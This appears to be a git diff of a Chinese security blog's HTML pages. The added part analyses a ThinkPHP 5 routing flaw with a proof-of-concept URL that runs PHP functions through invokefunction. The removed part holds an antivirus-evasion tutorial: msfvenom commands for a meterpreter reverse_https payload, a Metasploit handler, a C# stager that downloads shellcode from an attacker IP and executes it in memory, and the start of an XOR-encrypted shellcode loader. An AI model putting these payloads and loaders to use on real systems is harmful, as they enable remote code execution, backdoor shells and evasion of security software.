class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* 执行模块</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@param</span> array $result 模块/控制器/操作</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@param</span> array $config 配置参数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@param</span> bool $convert 是否自动转换控制器和操作名</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   \* <span class="doctag">@throws</span> HttpException</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line"></span><br><span class="line">​      $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    $request = Request::instance();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> ($config[<span class="string">'app_multi_module'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 多模块部署</span></span><br><span class="line"></span><br><span class="line">​      $module  = strip_tags(strtolower($result[<span class="number">0</span>] ?: $config[<span class="string">'default_module'</span>]));</span><br><span class="line"></span><br><span class="line">​      $bind   = Route::getBind(<span class="string">'module'</span>);</span><br><span class="line"></span><br><span class="line">​      $available = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> ($bind) &#123;</span><br><span class="line"></span><br><span class="line">​        <span class="comment">// 绑定模块</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">list</span>($bindModule) = explode(<span class="string">'/'</span>, $bind);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> (<span class="keyword">empty</span>($result[<span class="number">0</span>])) &#123;</span><br><span class="line"></span><br><span class="line">​          $module  = $bindModule;</span><br><span class="line"></span><br><span class="line">​          $available = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">​        &#125; <span class="keyword">elseif</span> ($module == $bindModule) &#123;</span><br><span class="line"></span><br><span class="line">​          $available = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125; <span class="keyword">elseif</span> (!in_array($module, $config[<span class="string">'deny_module_list'</span>]) &amp;&amp; is_dir(APP_PATH . $module)) &#123;</span><br><span class="line"></span><br><span class="line">​        $available = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 模块初始化</span></span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line"></span><br><span class="line">​        <span class="comment">// 初始化模块</span></span><br><span class="line"></span><br><span class="line">​        $request-&gt;module($module);</span><br><span class="line"></span><br><span class="line">​        $config = <span class="keyword">self</span>::init($module);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​        <span class="comment">// 模块请求缓存检查</span></span><br><span class="line"></span><br><span class="line">​        $request-&gt;cache(</span><br><span class="line"></span><br><span class="line">​          $config[<span class="string">'request_cache'</span>],</span><br><span class="line"></span><br><span class="line">​          $config[<span class="string">'request_cache_expire'</span>],</span><br><span class="line"></span><br><span class="line">​          $config[<span class="string">'request_cache_except'</span>]</span><br><span class="line"></span><br><span class="line">​        );</span><br><span class="line"></span><br><span class="line">​      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 单一模块部署</span></span><br><span class="line"></span><br><span class="line">​      $module = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">​      $request-&gt;module($module);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line"></span><br><span class="line">​    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 当前模块路径</span></span><br><span class="line"></span><br><span class="line">​    App::$modulePath = APP_PATH . ($module ? $module . DS : <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line"></span><br><span class="line">​    $convert = is_bool($convert) ? $convert : $config[<span class="string">'url_convert'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 获取控制器名</span></span><br><span class="line"></span><br><span class="line">​    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line"></span><br><span class="line">​    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 获取操作名</span></span><br><span class="line"></span><br><span class="line">​    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">​      $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 设置当前请求的控制器、操作</span></span><br><span class="line"></span><br><span class="line">​    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 监听module_init</span></span><br><span class="line"></span><br><span class="line">​    Hook::listen(<span class="string">'module_init'</span>, $request);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">​      $instance = Loader::controller(</span><br><span class="line"></span><br><span class="line">​        $controller,</span><br><span class="line"></span><br><span class="line">​        $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line"></span><br><span class="line">​        $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line"></span><br><span class="line">​        $config[<span class="string">'empty_controller'</span>]</span><br><span class="line"></span><br><span class="line">​      );</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 获取当前操作名</span></span><br><span class="line"></span><br><span class="line">​    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    $vars = [];</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 执行操作方法</span></span><br><span class="line"></span><br><span class="line">​      $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line"></span><br><span class="line">​      $reflect  = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line"></span><br><span class="line">​      $methodName = $reflect-&gt;getName();</span><br><span class="line"></span><br><span class="line">​      $suffix   = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">​      $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line"></span><br><span class="line">​      $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 空操作</span></span><br><span class="line"></span><br><span class="line">​      $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line"></span><br><span class="line">​      $vars = [$actionName];</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="comment">// 操作不存在</span></span><br><span class="line"></span><br><span class="line">​      <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里通过<code>invokeMethod</code> 函数动态调用方法，可以看到<code>$controller</code>是控制器<code>\think\app</code>，<code>$actionName</code>是<code>invokefunction</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">($url, $vars = [], $layer = <span class="string">'controller'</span>, $appendSuffix = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $info   = pathinfo($url);</span><br><span class="line">    $action = $info[<span class="string">'basename'</span>];</span><br><span class="line">    $module = <span class="string">'.'</span> != $info[<span class="string">'dirname'</span>] ? $info[<span class="string">'dirname'</span>] : Request::instance()-&gt;controller();</span><br><span class="line">    $class  = <span class="keyword">self</span>::controller($module, $layer, $appendSuffix);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($class) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_scalar($vars)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($vars, <span class="string">'='</span>)) &#123;</span><br><span class="line">                parse_str($vars, $vars);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $vars = [$vars];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> App::invokeMethod([$class, $action . Config::get(<span class="string">'action_suffix'</span>)], $vars);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例化控制器</p>
+<p><code>/thinkphp/library/think/Loader.php:474</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* 实例化（分层）控制器 格式：[模块名/]控制器名</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@param</span> string $name     资源地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@param</span> string $layer    控制层名称</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@param</span> bool  $appendSuffix 是否添加类名后缀</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@param</span> string $empty    空控制器名称</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@return</span> object</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* <span class="doctag">@throws</span> ClassNotFoundException</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">controller</span><span class="params">($name, $layer = <span class="string">'controller'</span>, $appendSuffix = false, $empty = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">list</span>($module, $class) = <span class="keyword">self</span>::getModuleAndClass($name, $layer, $appendSuffix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (class_exists($class)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> App::invokeClass($class);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($empty) &#123;</span><br><span class="line"></span><br><span class="line">    $emptyClass = <span class="keyword">self</span>::parseClass($module, $layer, $empty, $appendSuffix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (class_exists($emptyClass)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> $emptyClass(Request::instance());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">'class not exists:'</span> . $class, $class);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p><code>http://192.168.222.131/www/public/?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p>
+<ul>
+<li>分析<code>pathinfo()</code>函数的时候了解到可以用<code>s</code>来获取路由信息</li>
+<li><code>parseUrl</code>方法分割url为<code>[模块/控制器/操作]</code>格式</li>
+<li>传入<code>$controller</code>的时候，就是开始我们获取到路由的值，但是用反斜杠就开头，就是想要实例化的类</li>
+<li>最后是反射函数，调用了<code>invokefunction</code>方法执行<code>phpinfo()</code></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/24/无文件攻击方式简介/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1722,1266 +2123,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/05/利用C#byass AV/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/05/利用C#byass AV/" itemprop="url">《使用C＃编写自定义后门负载》学习笔记及免杀尝试</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-05T00:00:01+08:00">
-                2019-10-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/C/" itemprop="url" rel="index">
-                    <span itemprop="name">C#</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="《使用C＃编写自定义后门负载》学习笔记及免杀尝试"><a href="#《使用C＃编写自定义后门负载》学习笔记及免杀尝试" class="headerlink" title="《使用C＃编写自定义后门负载》学习笔记及免杀尝试"></a>《使用C＃编写自定义后门负载》学习笔记及免杀尝试</h1><p>最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。</p>
-<p><strong>注：本文由本人首发于先知社区</strong></p>
-<blockquote>
-<p>项目地址</p>
-</blockquote>
-<pre><code>https://github.com/mvelazc0/defcon27_csharp_workshop</code></pre><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
-<li>win10</li>
-<li>Windows defender</li>
-<li>win7</li>
-<li>360</li>
-<li>电脑管家<h1 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h1><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><blockquote>
-<p>最后结果：全过<br>lab2的思路是真的不错，使用Web服务识别msf第二阶段的uri，然后程序请求第二阶段的uri。<br>直接把stage加载进内存，这一招免杀力max，不过会留下一个很明显的窗口。</p>
-</blockquote>
-</li>
-</ul>
-<p>0x01</p>
-<pre><code>openssl genrsa&gt;privkey.pem    //生成密钥
-openssl req -new -x509 -key privkey.pem -out cert.pem -days 365    //用生成的密钥生成证书
-twistd -n web -c cert.pem -k privkey.pem --https=8080    //监听8080的web服务</code></pre><p>0x02</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/01.png" alt="avatar"><br> 将这个请求复制到lab2的2.cs中</p>
-<pre><code> using System.Net;
- using System.Text;
- using System.Configuration.Install;
- using System.Runtime.InteropServices;
- using System.Security.Cryptography.X509Certificates;
-
-public class Program
-{
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
-[DllImport(&quot;kernel32&quot;)]
-private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
-[DllImport(&quot;kernel32&quot;)]
-private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param,UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
-[DllImport(&quot;kernel32&quot;)]
-private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-private static UInt32 MEM_COMMIT = 0x1000;
-private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-
-
-public static void Main()
-{
-    string url = &quot;https://172.22.35.212:8080/jo8qpzUTLKP7YvpgpgVmjghsq-PI9uHda0z0YwHmVl9utBbhSUGY4-E6uVpp6bIO3Rz7wazCkbgwfIFGllVXGoy5cbHYeB7CXOXWqQ6xFDfamwN4QVt8db2SdcPRuEBonvwDwfrnXSAQdYJ14lFMV3mmyaNdqbiu9qhKGgKRRMWLCztXaPqMyfQ1ld8lqQC-7Nt7WLGD&quot;;
-    Stager(url);
-}
-
-public static void Stager(string url)
-{
-
-    WebClient wc = new WebClient();
-    wc.Headers.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36&quot;);
-    ServicePointManager.Expect100Continue = true;
-    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-
-    byte[] shellcode = wc.DownloadData(url);
-
-    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
-    IntPtr threatHandle = IntPtr.Zero;
-    UInt32 threadId = 0;
-    IntPtr parameter = IntPtr.Zero;
-    threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
-    WaitForSingleObject(threatHandle, 0xFFFFFFFF);
-
-}
-}</code></pre><p> 编译程序，然后msf开启监听，运行即返回session。</p>
-<pre><code>C:\windows\microsoft.net\framework\v4.0.30319\csc.exe 2.cs    //编译程序
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/02.png" alt="avatar"></p>
-<h1 id="lab3-lab4"><a href="#lab3-lab4" class="headerlink" title="lab3+lab4"></a>lab3+lab4</h1><blockquote>
-<p>最后结果：360，电脑管家过。<br>lab4 其实就是lab3的免杀版，通过对shellcode进行xor或aes加密来实现免杀.<br>windows defender一直没法pass,简单的修改加密的key值也无济于事。</p>
-</blockquote>
-<p>0x01</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080  -f csharp    //生成shellcode
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p>0x02</p>
-<pre><code>using System;
-using System.Text;
-using System.Runtime.InteropServices;
-
-
-public class Program
-{
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
-[DllImport(&quot;kernel32&quot;)]
-private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
-[DllImport(&quot;kernel32&quot;)]
-private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param,UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-
-//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
-[DllImport(&quot;kernel32&quot;)]
-private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-[DllImport(&quot;user32.dll&quot;)]
-static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-[DllImport(&quot;kernel32&quot;)]
-static extern IntPtr GetConsoleWindow();
-
-private static UInt32 MEM_COMMIT = 0x1000;
-private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-
-private static byte[] xor(byte[] cipher, byte[] key) {
-    byte[] xored = new byte[cipher.Length];
-
-    for(int i = 0; i &lt; cipher.Length; i++) {
-        xored[i] = (byte) (cipher[i] ^ key[i % key.Length]);
-    }
-
-    return xored;
-}
-
-
-static void Main()
-{
-    string key = &quot;ABCD&quot;;
-
